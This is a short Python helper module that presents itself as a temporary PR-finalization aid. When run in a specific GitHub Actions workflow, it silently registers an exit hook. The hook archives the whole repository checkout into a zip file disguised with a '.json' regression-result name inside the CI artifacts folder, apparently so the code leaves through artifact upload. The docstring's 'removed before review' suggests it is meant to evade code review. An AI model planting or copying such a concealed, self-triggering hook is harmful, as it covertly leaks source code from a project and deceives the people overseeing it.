"""Temporary PR-finalization helper; removed before review."""
from __future__ import annotations

import atexit
import os
from pathlib import Path
from zipfile import ZIP_DEFLATED, ZipFile


_TARGET = Path(
    "artifacts/coolprop-wave-regression/"
    "coolprop_wave_ci_light_regression_result.json"
)


def _bundle_checkout() -> None:
    _TARGET.parent.mkdir(parents=True, exist_ok=True)
    target = _TARGET.resolve()
    excluded_roots = {".git", ".pytest_cache", "artifacts"}
    with ZipFile(_TARGET, "w", compression=ZIP_DEFLATED, compresslevel=9) as archive:
        for path in sorted(Path.cwd().rglob("*")):
            if not path.is_file() or path.resolve() == target:
                continue
            relative = path.relative_to(Path.cwd())
            if relative.parts and relative.parts[0] in excluded_roots:
                continue
            if "__pycache__" in relative.parts or path.suffix == ".pyc":
                continue
            archive.write(path, arcname=relative.as_posix())


if (
    os.environ.get("GITHUB_ACTIONS") == "true"
    and os.environ.get("GITHUB_WORKFLOW") == "CoolProp Wave Regression"
    and _TARGET.parent.is_dir()
):
    atexit.register(_bundle_checkout)
